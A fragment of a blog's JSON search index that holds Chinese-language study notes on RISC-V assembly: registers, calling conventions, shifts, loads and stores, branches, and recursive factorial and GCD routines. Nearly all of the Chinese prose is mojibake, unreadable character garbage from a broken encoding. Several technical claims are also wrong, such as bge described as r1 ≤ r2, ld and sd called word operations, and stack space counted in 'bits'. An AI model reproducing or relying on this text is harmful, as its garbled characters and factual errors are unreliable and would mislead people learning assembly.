System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"æ“ä½œç³»ç»Ÿ","slug":"æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"è¾“å…¥/è¾“å‡º","slug":"è¾“å…¥-è¾“å‡º","permalink":"https://archer-baiyi.github.io/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"}]},{"title":"RISC-V æ±‡ç¼–è¯­è¨€å…¥é—¨","slug":"TUM info ç¬”è®°/ERA/RISC-V-æ±‡ç¼–è¯­è¨€å…¥é—¨","date":"2025-03-19T19:56:10.000Z","updated":"2025-10-26T09:49:47.975Z","comments":true,"path":"2025/03/19/TUM info ç¬”è®°/ERA/RISC-V-æ±‡ç¼–è¯­è¨€å…¥é—¨/","permalink":"https://archer-baiyi.github.io/2025/03/19/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/RISC-V-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"è®¡ç®—æœºä½“ç³»ç»“æ„åŸºç¡€ç›¸å…³ç¬”è®°","text":"ä¸‹è½½ RISC-V Simulator QtRvSimQtRvSimæ˜¯ä¸€ä¸ªç”±æ·å…‹æŠ€æœ¯å¤§å­¦å¼€å‘çš„é¡¹ç›®ï¼Œç”¨æ¥æ¨¡æ‹Ÿä¸€é¢— RISC-V å¤„ç†å™¨ã€‚ ä¸‹è½½é“¾æ¥ï¼šhttps://github.com/cvut/qtrvsim/releases/tag/v0.9.8 Windowsé€‰æ‹©å¸¦æœ‰â€mingw32â€çš„æ–‡ä»¶ã€‚ï¼ˆæ¯”å¦‚è¯´ qtrvsim-mingw32-v0.9.8.zipï¼‰ é€‰æ‹©é»˜è®¤çš„No pipeline no cacheï¼Œç„¶åç‚¹å‡»Exampleã€‚ åœ¨ä¸ŠåŠéƒ¨åˆ†å¯ä»¥çœ‹åˆ°æ‰€æœ‰å¯„å­˜å™¨ï¼ŒåŒ…æ‹¬å¯¹åº”çš„åŠ©è®°ç¬¦ï¼ˆmnemonicsï¼‰å’Œå€¼ã€‚ å·¦ä¾§å¯ä»¥çœ‹åˆ°è¦æ‰§è¡Œçš„æŒ‡ä»¤ã€‚æŒ‰ç…§ RISC-V ç”Ÿæ€ç³»ç»Ÿçš„å¸¸è§„çº¦å®šï¼Œç¨‹åºçš„æŒ‡ä»¤é€šå¸¸ä»åœ°å€ 0x200 å¼€å§‹ã€‚ å¯ä»¥é€šè¿‡â€œCoreâ€å’Œâ€œtemplate.Sâ€è¿™ä¸¤ä¸ªé€‰é¡¹å¡ï¼Œåœ¨å¤„ç†å™¨è§†å›¾å’Œæºç è§†å›¾ä¹‹é—´åˆ‡æ¢ã€‚ ç‚¹å‡»â€œCompile Source and update memoryâ€ï¼ˆå‘ä¸‹çš„è“è‰²ç®­å¤´ï¼‰ï¼Œå°†å½“å‰é€‰ä¸­çš„æºä»£ç ç¼–è¯‘å¹¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ ä¹‹åå¯ä»¥ç”¨PlayæŒ‰é’®å¯åŠ¨ç¨‹åºã€‚ä½œä¸ºç¤ºä¾‹ï¼Œç»ˆç«¯å³ä¾§ä¼šè¾“å‡ºæ–‡æœ¬â€œHello world.â€ã€‚ï¼ˆè¿™ä¸ªè¿è¡Œä¼šæŒç»­ä¸€æ®µæ—¶é—´ï¼Œä¸€ç‚¹ä¸€ç‚¹è¾“å‡ºï¼Œè¦æœ‰è€å¿ƒã€‚ï¼‰ RISC-V å¯„å­˜å™¨åœ¨ RISC-V ä¸­ï¼Œæ‰€æœ‰æ“ä½œæ•°ï¼ˆOperandenï¼‰éƒ½å­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­ã€‚ RISC-V ISA æ‹¥æœ‰ 32 æˆ– 33 ä¸ªï¼ˆå¯è§ï¼‰å¯„å­˜å™¨ï¼Œå…¶ä¸­x0æ°¸è¿œä¸ºé›¶ï¼Œè€Œx1 åˆ° x31 æ˜¯é€šç”¨æ•´æ•°å¯„å­˜å™¨ï¼Œf1 åˆ° f31 æ˜¯ æµ®ç‚¹å¯„å­˜å™¨ï¼š Register ABI Name Description Saver x0 zero Hard-wired zero â€” x1 ra Return address Caller x2 sp Stack pointer Callee x3 gp Global pointer â€” x4 tp Thread pointer â€” x5â€“7 t0â€“2 Temporaries Caller x8 s0/fp Saved register/frame pointer Callee x9 s1 Saved register Callee x10â€“11 a0â€“1 Function arguments/return values Caller x12â€“17 a2â€“7 Function arguments Caller x18â€“27 s2â€“11 Saved registers Callee x28â€“31 t3â€“6 Temporaries Caller Register ABI Name Description Saver f0â€“7 ft0â€“7 FP temporaries Caller f8â€“9 fs0â€“1 FP saved registers Callee f10â€“11 fa0â€“1 FP arguments/return values Caller f12â€“17 fa2â€“7 FP arguments Caller f18â€“27 fs2â€“11 FP saved registers Callee f28â€“31 ft8â€“11 FP temporaries Caller è¿™é‡Œç¬¬ä¸€åˆ—çš„æ˜¯æ¯ä¸ªå¯„å­˜å™¨çš„ç¼–å·ï¼Œè€Œç¬¬äºŒåˆ—åˆ™æ˜¯é™„å¸¦è¯­ä¹‰çš„åå­—ã€‚ä¸€èˆ¬åœ¨æ±‡ç¼–ä»£ç ä¸­ä½¿ç”¨ABI nameï¼Œä¾¿äºç†è§£å’Œç»´æŠ¤ã€‚ å…³äºSaveréƒ¨åˆ†å¯ä»¥çœ‹ä¸‹é¢è¿™ä¸ªè¡¨ï¼Œä¼šæ›´ç›´è§‚ä¸€ç‚¹ï¼š Name Meaning Saver Preserved across calls? ra Return address Caller No sp Stack pointer Callee Yes t0 - t6 Temporary registers Caller No s0 - s11 Callee-saved registers Callee Yes a0 - a7 Argument registers Caller No CalleræŒ‡çš„æ˜¯è°ƒç”¨å‡½æ•°çš„ä¸€æ–¹ï¼ˆæ¯”å¦‚è¯´main()ï¼‰ï¼Œè€ŒCalleeæŒ‡çš„åˆ™æ˜¯è¢«è°ƒç”¨çš„å‡½æ•°ã€‚ å¦‚æœä¸€ä¸ªregisterçš„Saveræ˜¯Callerï¼Œåˆ™è°ƒç”¨å‡½æ•°çš„ä¸€æ–¹ï¼ˆCallerï¼‰éœ€è¦åœ¨è°ƒç”¨å‡½æ•°å‰å°†è¿™äº›å¯„å­˜å™¨é‡Œçš„å€¼éƒ½å­˜å‚¨å¥½ï¼Œä»¥ä¾¿è¢«è°ƒç”¨å‡½æ•°å¯ä»¥éšæ„ä½¿ç”¨ï¼› å¦‚æœä¸€ä¸ªregisterçš„Saveræ˜¯Calleeï¼Œåˆ™è¢«è°ƒç”¨å‡½æ•°éœ€è¦ç¡®ä¿è¿™äº›å¯„å­˜å™¨çš„å€¼åœ¨è¯¥å‡½æ•°ç»“æŸåä¸ä¹‹å‰ä¸€æ¨¡ä¸€æ ·ã€‚ é€šä¿—ä¸€ç‚¹æ¥è®²ï¼Œå‰è€…æ˜¯å°†è‡ªå·±çš„ç¬”è®°æœ¬å¤‡ä»½å¥½ä¹‹åå€Ÿå‡ºå»ï¼Œå€Ÿç”¨æ–¹ï¼ˆCalleeï¼‰å¯ä»¥éšæ„ä½¿ç”¨ï¼›åè€…åˆ™æ˜¯å°†ç¬”è®°æœ¬å€Ÿå‡ºå»ï¼Œä½†å€Ÿç”¨æ–¹å¿…é¡»ç¡®ä¿æ‹¿åˆ°çš„æ—¶å€™æ˜¯ä»€ä¹ˆæ ·å­çš„è¿˜å›å»çš„æ—¶å€™ä¹Ÿå¾—æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚ RISC-V æ±‡ç¼–è¯­è¨€æ¯ä¸€ä¸ªISAï¼ˆInstruction Set Architectureï¼‰çš„æŒ‡ä»¤éƒ½å¯ä»¥åˆ†ä¸ºä»¥ä¸‹3å¤§ç±»ï¼š ç®—æœ¯å’Œé€»è¾‘è¿ç®—ï¼ˆArithmetische und logische Operationenï¼‰ æ•°æ®ä¼ è¾“ï¼ˆDatentransferï¼‰ ç¨‹åºæ§åˆ¶ ï¼ˆSteuerung des Programmablaufsï¼‰ï¼šè·³è½¬å’Œå­ç¨‹åºè°ƒç”¨ï¼ˆ SprÃ¼nge und Unterprogrammaufrufeï¼‰ RISC-V åŸºç¡€æ±‡ç¼–æŒ‡ä»¤ä¸€è§ˆï¼š ç®—æœ¯ ArithmetikåŠ æ³•ï¼š a = b + c 1add a,b,c å‡æ³•ï¼š a = b - c 1sub a,b,c ç»„åˆï¼š a = b + c - d 12add t,b,c # t=b+csub a,t,d # a=t-d æµ®ç‚¹æ•°çš„æƒ…å†µï¼š â€œFâ€ æ‹“å±•ç”¨äº Single Precision (32bit) Gleitkommaï¼› â€œDâ€ æ‹“å±•ç”¨äº Double Precision (64bit) Gleitkommaã€‚ 1234fadd a,b,cfsub a,b,cdadd a,b,cdsub a,b,c ä¹˜æ³•ï¼š æ³¨æ„ï¼Œä¹˜æ³•ä»¥åŠé™¤æ³•éƒ½æ˜¯éœ€è¦â€œMâ€æ‹“å±•ï¼ˆM-Erweiterungï¼‰çš„ã€‚ ä¹˜æ³•ç›¸å…³çš„æ“ä½œåŸºæœ¬ä¸Šå°±æ˜¯ä»¥ä¸‹å‡ ç§ï¼š åªä¸è¿‡RISC-V çš„åŸºæœ¬æ•´æ•°æŒ‡ä»¤é›†ä¸­ï¼ˆRV32I å’Œ RV64Iï¼‰ä¸åŒ…å« mul æŒ‡ä»¤ï¼Œä¹˜æ³•è¿ç®—é€šå¸¸éœ€è¦ M æ‰©å±•ï¼ˆRV32M/RV64Mï¼‰ã€‚å¦‚æœåªå…è®¸ä½¿ç”¨ RV32I/RV64I æŒ‡ä»¤ï¼Œåˆ™å¿…é¡»é€šè¿‡ç§»ä½å’ŒåŠ æ³•æ‰‹åŠ¨å®ç°ä¹˜æ³•ã€‚ åœ¨ç¡¬ä»¶å®ç°ä¸Šï¼Œç§»ä½æ“ä½œæ¯”ä¹˜æ³•æ›´å¿«ï¼Œå› ä¸ºç§»ä½ä»…æ¶‰åŠé€»è¾‘ç”µè·¯ï¼Œè€Œä¹˜æ³•é€šå¸¸éœ€è¦é¢å¤–çš„è®¡ç®—èµ„æºã€‚ ä¾‹å­ï¼š å‡è®¾ $s1 = 0x40000000 = 2^{30}$ $ s2 = 0x80000000 = -2^{31}$ $ s1 * s2 = -2^{61} = 0xE0000000 00000000$ é‚£ä¹ˆ 123mul s3, s1, s2mulh s4, s1, s2# &#123;s4,s3&#125; = s1 * s2 ä¾¿ä¼šå¾—åˆ° $ s4 = 0xE0000000; s3 = 0x00000000$ é™¤æ³•ä»¥åŠä½™æ•°ï¼š é€»è¾‘è¿ç®— Logische Operationå’Œï¼š a = b AND c 1and a,b,c æˆ–ï¼š 1or a,b,c å¼‚æˆ–ï¼š 1xor a,b,c ç§»ä½ï¼ˆShiftsï¼‰ï¼š ç§»ä½æ“ä½œåˆ†ä¸º2ç§ï¼š 1. é€»è¾‘ç§»ä½ logischer Shift ï¼Œç”¨ &gt;&gt;, &lt;&lt;è¡¨ç¤º ç”¨ 0 å¡«å……ç©ºå‡ºçš„é«˜ä½ï¼Œæ— è®ºåŸæ•°æ˜¯æ­£æ•°è¿˜æ˜¯è´Ÿæ•°(Null Bits nachgefÃ¼hrt)ï¼Œé€‚ç”¨äº æ— ç¬¦å·æ•°ï¼ˆunsigned numbersï¼‰ è®¡ç®—ã€‚ ä¾‹å­1ï¼š å‡è®¾ 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25ï¼ˆè¡¥ç è¡¨ç¤ºï¼‰ é‚£ä¹ˆç»è¿‡ 1srl t0, t0, 4 ä¼šå¾—åˆ° 1t0 = 0000 1111 1111 1111 1111 1111 1111 1110 = 268435454ï¼ˆæ­£æ•°ï¼‰ ä¾‹å­2ï¼š å‡è®¾ 1t0 = 0000 0000 0000 0000 0000 0000 0001 1001 # 25ï¼ˆåè¿›åˆ¶ï¼‰ é‚£ä¹ˆç»è¿‡ 1sll t0, t0, 4 ä¼šå¾—åˆ° 1t0 = 0000 0000 0000 0000 0000 0001 1001 0000 = 400ï¼ˆæ­£æ•°ï¼‰ ï¼ˆ$400 = 25 * 2^4$ï¼‰ 2. ç®—æœ¯ç§»ä½ arithmetischen Shiftï¼Œç”¨ &gt;&gt;&gt;, &lt;&lt;&lt; è¡¨ç¤º ä¼šä¿æŒç¬¦å·ä½ï¼ˆMSBï¼‰ä¸å˜ (erhÃ¤lt Vorzeichen, 0 oder 1 nachgefÃ¼hrt) å¦‚æœæ˜¯æ­£æ•°ï¼ˆMSB = 0ï¼‰ï¼Œåˆ™ç”¨ 0 å¡«å……é«˜ä½ã€‚ å¦‚æœæ˜¯è´Ÿæ•°ï¼ˆMSB = 1ï¼‰ï¼Œåˆ™ç”¨ 1 å¡«å……é«˜ä½ã€‚ é€‚ç”¨äº æœ‰ç¬¦å·æ•°ï¼ˆsigned numbersï¼‰ è®¡ç®—ï¼Œä¿æŒç¬¦å·æ­£ç¡®ã€‚ ä¾‹å­1ï¼š å‡è®¾ 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25ï¼ˆè¡¥ç è¡¨ç¤ºï¼‰ é‚£ä¹ˆç»è¿‡ 1sra t0, t0, 4 ä¼šå¾—åˆ° 1t0 = 1111 1111 1111 1111 1111 1111 1111 1110 = -2 (è´Ÿæ•°) å·¦ç§»æœ¬è´¨ä¸Šå°±æ˜¯ä¹˜æ³•ã€‚æ— è®ºæœ‰ç¬¦å·æ•°è¿˜æ˜¯æ— ç¬¦å·æ•°ï¼Œå·¦ç§»çš„è¡Œä¸ºéƒ½æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥ RISC-V æ²¡æœ‰ slaæŒ‡ä»¤ã€‚ è¿™é‡Œçš„ uimm ä¼šè¢«é™åˆ¶åœ¨ 5-bit çš„æ— ç¬¦å·æ•´æ•°ã€‚ æ•°æ®ä¼ è¾“ï¼ˆDatentransferï¼‰è¯»å–ï¼ˆLesen vom Speicherï¼‰ï¼š ld (load word) åŠ è½½å†…å­˜é‡Œçš„å€¼ Formatï¼š 1ld destination, offset(base) ä¾‹å­ï¼š 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) a1å­˜å‚¨çš„æ˜¯åœ°å€ (s0é‡Œå­˜å‚¨çš„åœ°å€+8) çš„å€¼ la (load adress) åŠ è½½åœ°å€ ï¼ˆç®—ä¼ªå‘½ä»¤ï¼Œ Pseudoinstruktionï¼‰ ä¾‹å­ï¼š å‡å¦‚ç°åœ¨æœ‰ 12345678.datavar: .word 42.text.globl mainmain: la a0, var # æŠŠå˜é‡ var çš„åœ°å€åŠ è½½è¿› a0ï¼ˆä¾‹å¦‚ a0 = 0x10010000ï¼‰ lw a1, 0(a0) # æŠŠ var è¿™ä¸ªåœ°å€å¤„çš„ 4 å­—èŠ‚å†…å®¹ï¼ˆå³ 42ï¼‰åŠ è½½è¿› a1 é‚£ä¹ˆæœ€ç»ˆç»“æœä¸º 12a0 = åœ°å€ï¼Œæ¯”å¦‚ 0x10010000a1 = 42 å†™å…¥ï¼ˆSchreiben in den Speicherï¼‰ï¼š sd (store word) Formatï¼š 1sd source, offset(base) ä¾‹å­ï¼š 1sd a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) è·³è½¬ Sprungæ— æ¡ä»¶è·³è½¬ï¼š 12j immjr reg, imm ç¬¬ä¸€ä¸ªä¼šè·³è½¬åˆ°PC = PC + imm ç¬¬ä¸€ä¸ªä¼šè·³è½¬åˆ°PC = reg + imm æœ‰æ¡ä»¶è·³è½¬ï¼š æ ¼å¼ï¼š 1bxx r1,r2,imm bxxçš„å¯é€‰é€‰é¡¹ï¼š branch if equal (beq)ï¼š$r1 = r2$ branch if not equal (bne)ï¼š$r1 \\neq r2$ branch if less than (blt)ï¼š$r1 &lt; r2$ branch if greater than or equal (bge)ï¼š$r1 \\leq r2$ ä¾‹å­1ï¼ˆifï¼‰ï¼š 12345if (i == j)&#123; f = g + h;&#125;f = f â€“ i; è·Ÿä¸Šé¢è¿™æ®µcä»£ç ç­‰ä»·çš„RISC-V Assemblerï¼ˆæ±‡ç¼–ï¼‰ï¼š 123456# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2L1: sub s0, s0, s3 ä¾‹å­2ï¼ˆif, elseï¼‰ï¼š 1234if (i == j)&#123; f = g + h;&#125;else&#123; f = f - i;&#125; è·Ÿä¸Šé¢è¿™æ®µcä»£ç ç­‰ä»·çš„RISC-V Assemblerï¼ˆæ±‡ç¼–ï¼‰ï¼š 12345678# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2 j doneL1: sub s0, s0, s3done: ä¾‹å­2ï¼ˆwhile å¾ªç¯ï¼‰ï¼š 12345678// Berechne x, so dass// 2^x = 128int pow = 1;int x = 0;while (pow != 128) &#123;pow = pow * 2;x = x + 1;&#125; è·Ÿä¸Šé¢è¿™æ®µcä»£ç ç­‰ä»·çš„RISC-V Assemblerï¼ˆæ±‡ç¼–ï¼‰ï¼š 12345678910# s0 = pow, s1 = x addi s0, zero, 1 add s1, zero, zero addi t0, zero, 128while: beq s0, t0, done slli s0, s0, 1 addi s1, s1, 1 j whiledone: æ³¨æ„ï¼Œè¿™æ ·å†™1addi t0, 128, zero æ˜¯ä¸åˆæ³•çš„ï¼Œå³éæ³•æŒ‡ä»¤ ã€‚è¯¦è§åé¢çš„â€œå¸¦æœ‰ç«‹å³æ•°ï¼ˆimmediateï¼‰çš„å‘½ä»¤â€ã€‚ å­ç¨‹åºè°ƒç”¨ UnterprogrammeBegriffeï¼š Callerï¼ˆè°ƒç”¨è€…ï¼‰ï¼šè°ƒç”¨å‡½æ•°çš„ä»£ç ï¼ˆå¦‚ main()ï¼‰ã€‚ Calleeï¼ˆè¢«è°ƒç”¨è€…ï¼‰ï¼šè¢«è°ƒç”¨çš„å‡½æ•°ï¼ˆå¦‚ simple()ï¼‰ã€‚ 12jal reg, offset #è°ƒç”¨jr ra #è¿”å› ä¾‹å­ï¼š 12345678int main() &#123; simple(); a = b + c;&#125;void simple() &#123;return;&#125; è·Ÿä¸Šé¢è¿™æ®µcä»£ç ç­‰ä»·çš„RISC-V Assemblerï¼ˆæ±‡ç¼–ï¼‰ï¼š 123450x00000300 main: jal simple # call0x00000304 add s0, s1, s2... ...0x0000051c simple: jr ra # return å…¶ä»–çš„ä¼ªå‘½ä»¤ï¼š 1mv ra, rb è·Ÿ 12add ra,rb,x0addi ra,rb,0 ç­‰ä»·ã€‚ é€’å½’ï¼ˆRekursionï¼‰æ™®é€šé€’å½’ä¾‹å­1ï¼šé˜¶ä¹˜ 1234int factorial(int n) &#123; if (n == 0) return 1; return n * factorial(n - 1); // ï¼ˆé€’å½’è°ƒç”¨åè¿˜æœ‰ä¹˜æ³•,æ‰€ä»¥æ˜¯éå°¾é€’å½’ï¼‰&#125; å¯¹åº”çš„RISC-Vï¼ˆn=4çš„æƒ…å†µç¤ºä¾‹ï¼‰ï¼š 1234567891011121314151617181920212223 _start:0x200 addi a0, zero, 4 # a0 = 4ï¼Œè®¡ç®— 4 çš„é˜¶ä¹˜ï¼ˆä½œä¸ºè¾“å…¥å‚æ•°ï¼‰0x204 jal ra, magic # è·³è½¬è°ƒç”¨ magic å‡½æ•°ï¼ˆé€’å½’å®ç°é˜¶ä¹˜ï¼‰ï¼Œè¿”å›åœ°å€å­˜å…¥ ra0x208 ebreak # ç¨‹åºæ–­ç‚¹ï¼ˆæ¨¡æ‹Ÿå™¨ä¸­ç”¨äºåœæ­¢æ‰§è¡Œï¼‰ magic:0x20c beq a0, zero, break # å¦‚æœ a0 == 0ï¼Œè·³è½¬åˆ° breakï¼ˆ0! = 1ï¼‰0x210 addi sp, sp, -8 # åˆ†é…æ ˆç©ºé—´ï¼šåªä¿å­˜ ra å’Œ a0ï¼Œæ‰€ä»¥æ˜¯2*4=8Bits0x214 sw ra, 0(sp) # ä¿å­˜è¿”å›åœ°å€ ra åˆ°æ ˆé¡¶0x218 sw a0, 4(sp) # ä¿å­˜å½“å‰å‚æ•° a0ï¼ˆnï¼‰0x21c addi a0, a0, -1 # a0 = a0 - 1ï¼Œå‡†å¤‡é€’å½’è°ƒç”¨ magic(n-1)0x220 jal ra, magic # é€’å½’è°ƒç”¨ magic(n-1)ï¼Œè¿”å›å€¼ä»å­˜åœ¨ a0 ä¸­0x224 lw t0, 4(sp) # ä»æ ˆä¸­æ¢å¤åŸæ¥çš„ a0ï¼ˆä¹Ÿå°±æ˜¯ nï¼‰0x228 mul a0, a0, t0 # a0 = a0 * nï¼ˆä¹Ÿå°±æ˜¯ n! = n * (n-1)!ï¼‰0x22c lw ra, 0(sp) # æ¢å¤ä¹‹å‰ä¿å­˜çš„è¿”å›åœ°å€0x230 addi sp, sp, 8 # å›æ”¶æ ˆç©ºé—´0x234 jalr zero, 0(ra) # è¿”å›è°ƒç”¨è€…ï¼ˆå‡½æ•°è¿”å›ï¼‰ break:0x238 addi a0, zero, 1 # a0 = 1ï¼Œè¿”å› 1ï¼ˆ0! = 1ï¼‰0x23c jalr zero, 0(ra) # è¿”å›è°ƒç”¨è€… ç”±äºæ¯æ¬¡è®¡ç®— factorial(n) çš„å€¼æ—¶éœ€è¦å…ˆç­‰ factorial(n-1)çš„è®¡ç®—ç»“æœå…ˆå‡ºæ¥ï¼Œæ‰€ä»¥ç­‰å¾…æœŸé—´éœ€è¦å°†æ‰€æœ‰çš„ n éƒ½ç»™å­˜åœ¨stacké‡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š 123456789101112factorial(4) â†’ éœ€è¦ç­‰factorial(3) çš„ç»“æœ â†’ éœ€è¦ç­‰ factorial(2) çš„ç»“æœ â†’ éœ€è¦ç­‰ factorial(1) çš„ç»“æœ â†’ éœ€è¦ç­‰ factorial(0) çš„ç»“æœ â†’ è¿”å› 1ç„¶åå¼€å§‹å›æº¯è®¡ç®—ï¼šfactorial(1): 1 * 1 = 1factorial(2): 2 * 1 = 2factorial(3): 3 * 2 = 6factorial(4): 4 * 6 = 24 è€Œæ ˆç»“æ„å¦‚ä¸‹ï¼š 12345678910111213+--------------------+| 0x4 || 0x208 |+--------------------+| 0x3 || 0x224 |+--------------------+| 0x2 || 0x224 |+--------------------+| 0x1 || 0x224 |+--------------------+ è¿”å›çš„æ—¶å€™åˆ™æ˜¯è¿™æ ·ï¼šå½“a0=0çš„æ—¶å€™è§¦å‘0x20cçš„beqï¼Œè·³è½¬åˆ°breakï¼Œbreakæ‰§è¡Œå®Œäº†ä¼šè·³è½¬åˆ°å½“å‰çš„raï¼ˆä¹Ÿå°±æ˜¯stackæœ€åº•ä¸‹ä¸€è¡Œçš„0x224ï¼‰ï¼Œç„¶åè¿›è¡Œè¿™éƒ¨åˆ†æ“ä½œï¼š 123450x224 lw t0, 4(sp) # ä»æ ˆä¸­æ¢å¤åŸæ¥çš„ a0ï¼ˆä¹Ÿå°±æ˜¯ nï¼‰0x228 mul a0, a0, t0 # a0 = a0 * nï¼ˆä¹Ÿå°±æ˜¯ n! = n * (n-1)!ï¼‰0x22c lw ra, 0(sp) # æ¢å¤ä¹‹å‰ä¿å­˜çš„è¿”å›åœ°å€0x230 addi sp, sp, 8 # å›æ”¶æ ˆç©ºé—´0x234 jalr zero, 0(ra) # è¿”å›è°ƒç”¨è€…ï¼ˆå‡½æ•°è¿”å›ï¼‰ è®¡ç®—a0 = 1*1ç„¶åç»§ç»­è·³è½¬åˆ°stackå€’æ•°ç¬¬ä¸‰è¡Œçš„0x224ï¼Œé‡å¤ä¸‹å»çŸ¥é“è·³è½¬åˆ°0x208ï¼Œè§¦å‘æ–­ç‚¹ã€‚ ä¾‹å­2ï¼šæœ€å¤§å…¬çº¦æ•° 12345678unsigned ggT(unsigned a, unsigned b) &#123; if (a == b) return a; else if (a &lt; b) return ggT(a, b - a); else return ggT(a - b, b);&#125; å¯¹åº”çš„RISC-Vï¼š 1234567891011121314151617181920ggT: beq a0, a1, finished # å¦‚æœ a0 == a1ï¼Œåˆ™è·³è½¬åˆ° finishedï¼ˆè¿”å›ç»“æœï¼‰ bltu a0, a1, lt # å¦‚æœ a0 &lt; a1ï¼Œåˆ™è·³è½¬åˆ° lt æ ‡ç­¾ï¼ˆäº¤æ¢é¡ºåºï¼‰ sub a0, a0, a1 # å¦åˆ™ a0 &gt; a1ï¼Œæ‰§è¡Œ a0 = a0 - a1 j cont # è·³è½¬åˆ° contï¼Œå‡†å¤‡é€’å½’è°ƒç”¨lt: sub a1, a1, a0 # æ‰§è¡Œ b = b - a ï¼ˆå³ a1 = a1 - a0ï¼‰cont: addi sp, sp, -16 # ä¸ºè¿”å›åœ°å€åˆ›å»ºæ ˆç©ºé—´ï¼ˆé€’å½’è°ƒç”¨å‰ä¿å­˜è¿”å›åœ°å€ï¼‰ sw ra, 0(sp) # ä¿å­˜è¿”å›åœ°å€ jal ra, ggT # é€’å½’è°ƒç”¨ ggTï¼ˆjump and linkï¼‰ lw ra, 0(sp) # æ¢å¤è¿”å›åœ°å€ addi sp, sp, 16 # å›æ”¶æ ˆç©ºé—´ jalr zero, 0(ra) # è¿”å›ï¼ˆè·³è½¬å›ä¸Šå±‚è°ƒç”¨ï¼‰ finished: jalr zero, 0(ra) # è¿”å›å½“å‰çš„ a0 ä½œä¸ºç»“æœ æ€»ç»“ä¸€ä¸‹ï¼š æ¯ä¸ªRecursiveçš„å‡½æ•°é€’å½’éƒ¨åˆ†ä¼šåˆ†æˆ2éƒ¨åˆ†ï¼š ä»å½“å‰nçš„æƒ…å†µè·³è½¬åˆ°n-1ï¼Œä¿å­˜å½“å‰nçš„å€¼ä»¥åŠè¿”å›åœ°å€ï¼ˆå³å½“å‰è·³è½¬å‘½ä»¤çš„ä¸‹ä¸€è¡Œçš„åœ°å€ï¼‰ è¯»å–è¿”å›åœ°å€å¹¶ç”¨å½“å‰å·²ç»è®¡ç®—å‡ºæ¥çš„n-1çš„æƒ…å†µçš„å€¼ä¸nè¿›è¡Œå‡½æ•°è¿ç®—ã€‚ ç›¸å½“äºé€’å‡å®Œäº†ä¹‹åè¿˜å¾—é€’å¢å›æ¥ã€‚ æ³¨æ„ï¼Œ2ä¸ªä¾‹å­é‡Œåˆ†é…çš„stackçš„å¤§å°æ˜¯ä¸ä¸€æ ·çš„ï¼Œè¿™ä¸ªä¸»è¦æ˜¯çœ‹ABIçš„å…·ä½“è¦æ±‚ï¼Œè¿™é‡Œä¸»è¦ç›®çš„æ˜¯ç¤ºèŒƒè€Œå·²ã€‚ä½†ä¸ç®¡å¤§å°å¦‚ä½•ï¼Œä¸€å®šè¦ä¿è¯åˆ†é…çš„Stackå¤§å°å’Œå›æ”¶çš„å¤§å°æ˜¯ä¸€è‡´çš„ã€‚ å°¾é€’å½’ï¼ˆTail Rekursiobï¼‰è§‚å¯Ÿä¸Šé¢ä¾‹å­é‡Œstackå­˜å‚¨çš„å†…å®¹ä¸éš¾å‘ç°ï¼Œå¦‚æœé€’å½’çš„æ¬¡æ•°è¾ƒé«˜ï¼Œåˆ™ä¼šå¾ˆå®¹æ˜“å¯¼è‡´Stack Overflowã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦ä¸€ç§é€’å½’æ–¹å¼ï¼šå°¾é€’å½’ï¼ˆTail Rekursiobï¼‰ è¿˜æ˜¯æ‹¿é˜¶ä¹˜ä¸¾ä¾‹ï¼Œæˆ‘ä»¬å°†ä»£ç ä¼˜åŒ–æˆè¿™æ ·ï¼š 1234int factorial(int n, int acc = 1) &#123; if (n == 0) return acc; return factorial(n - 1, n * acc); // å°¾è°ƒç”¨&#125; å¯¹åº”çš„RISC-Vï¼š 123456789factorial: beqz a0, end_factorial mul a1, a0, a1 # acc = acc * n addi a0, a0, -1 # n = n-1 tail factorial # å°¾è°ƒç”¨ï¼ˆè·³è½¬ï¼Œæ— éœ€ä¿å­˜è¿”å›åœ°å€ï¼‰end_factorial: mv a0, a1 # è¿”å›ç»“æœ ret è¿™é‡Œçš„è°ƒç”¨è¿‡ç¨‹åˆ™ä¼šå˜æˆï¼š 12345factorial(3, 1)â†’ ç›´æ¥ tail call åˆ° factorial(2, 3)â†’ å† tail call åˆ° factorial(1, 6)â†’ å† tail call åˆ° factorial(0, 6)â†’ ç»“æŸï¼šè¿”å› acc = 6 æ ˆç»“æ„å¦‚ä¸‹ï¼š 12345678910+--------------------+| å½“å‰è°ƒç”¨ï¼ˆå¤ç”¨æ ˆå¸§ï¼‰|| n=3, acc=1 |â†’ tail call â†’ æ›¿æ¢ä¸ºï¼š| n=2, acc=3 |â†’ tail call â†’ æ›¿æ¢ä¸ºï¼š| n=1, acc=6 |â†’ tail call â†’ æ›¿æ¢ä¸ºï¼š| n=0, acc=6 |â†’ return 6 ä¸å†éœ€è¦å­˜å‚¨æ‰€æœ‰ä¸­é—´çš„ n çš„å€¼ã€‚ç›¸å½“äºæ˜¯ç›´æ¥è·³è½¬è€Œä¸æ˜¯ç­‰å¾…ã€‚ å¸¦æœ‰ç«‹å³æ•°ï¼ˆimmediateï¼‰çš„å‘½ä»¤ç«‹å³æ•°ï¼ˆImmediate/Konstanteï¼‰ï¼šç”±æŒ‡ä»¤æœ¬èº«æºå¸¦ï¼Œä¸éœ€è¦ä»å¯„å­˜å™¨æˆ–å†…å®¹ä¸­åŠ è½½ aadi a = b + immï¼ˆä¸€ä¸ªç«‹å³æ•°ï¼‰ 